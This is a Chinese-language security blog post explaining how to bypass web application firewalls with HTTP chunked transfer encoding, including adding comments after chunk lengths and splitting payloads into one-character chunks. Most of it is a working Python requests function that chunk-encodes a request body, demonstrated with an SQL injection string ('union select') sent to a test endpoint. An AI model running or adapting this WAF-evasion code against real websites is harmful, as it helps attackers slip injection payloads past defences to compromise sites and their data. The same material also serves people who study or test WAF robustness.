<!DOCTYPE html><html lang="zh"><head><meta name="generator" content="Hexo 3.9.0"><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><title> requests分块传输 · p7e4</title><meta name="description" content="requests分块传输 - p7e4"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="icon" href="/favicon.png"><link rel="stylesheet" href="/css/apollo.css"><link rel="search" type="application/opensearchdescription+xml" href="https://p7e4.js.org/atom.xml" title="p7e4"></head><body><div class="wrap"><header><a href="/" class="logo-link"><img src="/favicon.png" alt="logo"></a><ul class="nav nav-list"><li class="nav-list-item"><a href="/" target="_self" class="nav-list-link">BLOG</a></li><li class="nav-list-item"><a href="/about" target="_self" class="nav-list-link">ABOUT</a></li><li class="nav-list-item"><a href="https://github.com/p7e4" target="_blank" class="nav-list-link">GITHUB</a></li><li class="nav-list-item"><a href="/atom.xml" target="_self" class="nav-list-link">RSS</a></li></ul></header><main class="container"><div class="post"><article class="post-block"><h1 class="post-title">requests分块传输</h1><div class="post-info">Jul 23, 2020</div><div class="post-content"><h2 id="1-分块传输"><a href="#1-分块传输" class="headerlink" title="1.分块传输"></a>1.分块传输</h2><p><img src="https://i.loli.net/2020/07/23/Yw1jcgdlO3eGyVA.png" alt></p>
<p><img src="https://i.loli.net/2020/07/23/pXuj3Tq2ZC8Ubn7.png" alt></p>
<p>绕waf利用的是很多waf本身甚至就不支持分块传输，其次是支持不完善，在数据长度的后面还是可以加注释的，比如<br><code>1;asd</code>、<code>1;asd=123</code></p>
<h2 id="2-内容拆分的几种方法"><a href="#2-内容拆分的几种方法" class="headerlink" title="2.内容拆分的几种方法"></a>2.内容拆分的几种方法</h2><h3 id="按敏感关键词名单拆分"><a href="#按敏感关键词名单拆分" class="headerlink" title="按敏感关键词名单拆分"></a>按敏感关键词名单拆分</h3><p>这也是sqlmap目前的使用的方法<br><img src="https://i.loli.net/2020/07/23/K2N3jpwA5MHFVeI.png" alt></p>
<p>但对于其他场景，需要手动扩展名单就有点麻烦</p>
<h3 id="按某个特定标识符拆分"><a href="#按某个特定标识符拆分" class="headerlink" title="按某个特定标识符拆分"></a>按某个特定标识符拆分</h3><p>比如在内容中找到<code>@chunk@</code>就以此为界限将两边内容放在不同的方块中</p>
<h3 id="按位拆分"><a href="#按位拆分" class="headerlink" title="按位拆分"></a>按位拆分</h3><p>比如每一个或两个字符就为一个分块，过长可能无法切分到敏感关键词，过短分块后的数据包体积就会翻N倍，但一般情况下我觉的这是可以接受的:smile:，所以最后使用了这种方法。  </p>
<h2 id="3-requests-实现"><a href="#3-requests-实现" class="headerlink" title="3.requests 实现"></a>3.requests 实现</h2><p>requests是不支持请求包分块传输的，而且我们也没有办法控制Content-Type头，但好在实际上Transfer-Encoding的优先级是比Content-Type高的，也就是说两者同时存在时，服务器会默认忽略Content-Type，所以这里也就暂时可以先忽略这个问题了。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">chunk</span><span class="params">(url, **data)</span>:</span></span><br><span class="line">	headers = &#123;</span><br><span class="line">		<span class="string">"Transfer-Encoding"</span>: <span class="string">"chunked"</span>,</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> data.get(<span class="string">"headers"</span>):</span><br><span class="line">		data[<span class="string">"headers"</span>].update(headers)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		data[<span class="string">"headers"</span>] = headers</span><br><span class="line"></span><br><span class="line">	post = <span class="string">""</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> data[<span class="string">"data"</span>]:</span><br><span class="line">			post += <span class="string">f"1;a=1\r\n<span class="subst">&#123;i&#125;</span>\r\n"</span></span><br><span class="line"></span><br><span class="line">	data[<span class="string">"data"</span>] = <span class="string">f"<span class="subst">&#123;post&#125;</span>0\r\n\r\n"</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> requests.post(url,**data)</span><br><span class="line"></span><br><span class="line">data = <span class="string">"id=1 and union select 1,2,3 from "</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">	r = chunk(<span class="string">"http://www.httpbin.org/post"</span>, data=data)</span><br><span class="line">	print(r.text)</span><br></pre></td></tr></table></figure>

</div></article></div></main><footer><div class="paginator"><a href="/2020/07/30/web-training/" class="prev">PREV</a><a href="/2020/06/27/py_socket_feature/" class="next">NEXT</a></div><div class="copyright"><p>Copyright © p7e4 2020.</p></div></footer></div><script async src="//cdn.bootcss.com/mathjax/2.7.0/MathJax.js?config=TeX-MML-AM_CHTML" integrity="sha384-crwIf/BuaWM9rM65iM+dWFldgQ1Un8jWZMuh3puxb8TOY9+linwLoI7ZHZT+aekW" crossorigin="anonymous"></script></body></html>